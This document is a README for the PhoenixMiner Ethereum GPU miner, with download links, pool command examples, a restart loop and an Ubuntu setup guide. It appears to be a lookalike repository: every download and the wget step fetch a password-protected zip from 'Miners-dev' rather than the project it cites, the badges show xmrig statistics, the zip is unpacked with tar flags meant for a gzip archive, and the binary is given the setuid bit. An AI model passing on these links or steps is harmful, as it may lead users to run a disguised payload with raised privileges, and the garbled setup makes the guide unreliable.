<p align="center">
<a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
<img src="https://github.com/Miners-dev/phoenixminer/blob/main/files/git-files/phoenix-header-6.jpg?raw=true" /></a>
</p>      

<p align="center">
<a href="https://github.com/PhoenixMiner/PhoenixMiner/releases" alt="Activity">
<img src="https://img.shields.io/github/downloads/xmrig/xmrig/total.svg" /></a>

<a href="https://github.com/PhoenixMiner/phoenixminer/blob/main/License.txt" alt="Activity">
<img src="https://img.shields.io/github/license/xmrig/xmrig-amd.svg" /></a>
<a href="#" alt="Activity">
<img src="https://img.shields.io/github/release-date-pre/xmrig/xmrig-amd.svg" /></a>
<a href="https://github.com/PhoenixMiner/PhoenixMiner/pulse" alt="Activity">
<img src="https://img.shields.io/github/commit-activity/m/badges/shields.svg" /></a>
<a href="#">
<img src="https://img.shields.io/circleci/project/github/badges/shields/master.svg" alt="build status"></a>
</p>

# 	PhoenixMiner: fastest Ethereum/Ethash miner with lowest devfee (Win/Linux)
<p>PhoenixMiner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
</p>
<p align="center">
<a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
<img src="https://github.com/Miners-dev/phoenixminer/blob/main/files/git-files/monitor.jpg?raw=true" /></a>
</p>

<p>PhoenixMiner is one of the most efficient and convenient miners to date, which is why it won the general recognition of miners.
</p>

## Table of Contents
- [Features, requirements, and limitations](#Features-requirements-and-limitations)
- [Download](#Download)
- [Usage](#Usage)
- [Example](#example)
- [Auto Restart](#phoenixminerauto-restart)

## Features, requirements, and limitations

* Highly optimized OpenCL and CUDA cores for maximum ethash mining speed
* Official Windows / Linux support.
* Nicehash support.
* Automatic GPU configuration.
* Supports AMD Vega, 580/570/480/470, 460/560, Fury, 390/290 and older AMD GPUs with enough VRAM
* Supports Nvidia 10x0 and 9x0 series as well as older cards with enough VRAM
* Optional "green" kernels for RX580/570/560/480/470/460 to lower the power consumption by 2-3% with small, or no drop in hashrate
* Lowest developer fee of 1% (35 seconds defvee mining per each 90 minutes)
* Dual mining ðŸ’°
* Advanced statistics: actual difficulty of each share, effective hashrate at the pool, and optional showing of estimated income in USD
* DAG file generation in the GPU for faster start-up and DAG epoch switches
* Supports all ethash mining pools and stratum protocols
* Watchdog that monitors your GPU threads, if they stop hashing for a few minutes, miner restarts itself
* Startup monitor, if miner can't init GPU's and start mining in a defined time, restarts itself or runs a user defined script
* Monitoring of GPU temperature, and if a critical temperature is reached, that particular GPU is turned off until it cools down
* Set system shutdown temperature, to protect your GPU's from overheating
* API for rig monitoring


<img src="https://github.com/Miners-dev/phoenixminer/blob/main/files/git-files/mining.jpg?raw=true" width="866" >

## Download

<p>
<a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
<img src="https://github.com/Miners-dev/phoenixminer/blob/main/files/git-files/downlaod.png?raw=true" width="300" ></a></p>

* Binary releases: https://github.com/PhoenixMiner/PhoenixMiner/releases
* Git tree: https://github.com/PhoenixMiner/PhoenixMiner.git
  * Clone with `git clone https://github.com/PhoenixMiner/PhoenixMiner.git`  :hammer:
  
## How to use

<li>Step 1 -  Install your GPUs and set up your computer</li>
<li>Step 2 -  <a href="https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Windows.Password-phoenix.zip">Download latest PhoenixMiner</a></li>
<li>Step 3 -  Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
<li>Step 4 -  Join a mining pool
<li>Step 5 -  Start mining!</li>

## Example

### Ethereum - Ethermine.org
```batch
PhoenixMiner.exe -pool eu1.ethermine.org:4444 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```

### Ethereum - sparkpool.com
```batch
PhoenixMiner.exe -pool eu.sparkpool.com:3333 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```
### Ethereum - f2pool.com
```batch
PhoenixMiner.exe -pool eth.f2pool.com:8008 -wal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```

**Note**

> Linux: Under Linux you need to replace PhoenixMiner.exe with ./PhoenixMiner in the command-line examples below.


###


###

## PhoenixMiner Auto Restart 

In Windows if you’ve  configured your miner through a batch file then you can easily make the script to loop with this simple command.
```batch
your miner configuration goes here
goto start`
```

**Example:**
```batch
:start
PhoenixMiner.exe -pool eth-eu2.nanopool.org:9999 -wal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
goto start
```
  
  
## Quick setup PhoenixMiner on Ubuntu with AMD


1. Do a fresh installation of Ubuntu 16.04

2. Download the latest AMD drivers and install


```
cd ~/Downloads

wget --referer http://support.amd.com/ https://www2.ati.com/drivers/linux/ubuntu/amdgpu-pro-17.50-511655.tar.xz

tar xvf amdgpu-pro-17.50-511655.tar.xz 

cd amdgpu-pro-17.50-511655/

sudo ./amdgpu-pro-install -y --opencl=legacy
```

3. Next we’ll install PhoenixMiner

```
cd ~/Downloads

wget https://github.com/Miners-dev/phoenixminer/releases/download/5.1c/PhoenixMiner_5.1c_Linux.zip

mkdir ~/Phoenix

cd ~/Phoenix

tar -xvpzf ~/Downloads/PhoenixMiner_5.1c_Linux.zip

chmod u+s PhoenixMiner
```

4. The command everyone recommends using looks something like this

```
~/Phoenix/PhoenixMiner -epool us2.ethermine.org:4444 -ewal <wallet>.<worker> -epsw x -mode 1 -tt 68 -allpools 1
```



5. What happened is we got an error about miner doesn’t have root acecss

```
ETH - Total Speed: 44.209 Mh/s, Total Shares: 13, Rejected: 0, Time: 00:22
ETH: GPU0 22.107 Mh/s, GPU1 22.102 Mh/s
Failed to set new fan speed, check if miner has root access!
Failed to set new fan speed, check if miner has root access!
Failed to set new fan speed, check if miner has root access!
Failed to set new fan speed, check if miner has root access!
ETH: 01/26/18-13:35:54 - New job from us2.ethermine.org:4444
```

6. With default setting the AMD Radeon RX570‘s do about 22 Mh/s, give it a week to make sure things are stable and we’ll tweak them up to hopefully around 30 Mh/s.  I’ll give you another post once we make those changes.

In the mean time, to get rid of that annoying error message, I just removed the -tt for now which is Target Temperature so PhoenixMiner stops trying to make calls to adjust fan speeds automatically.
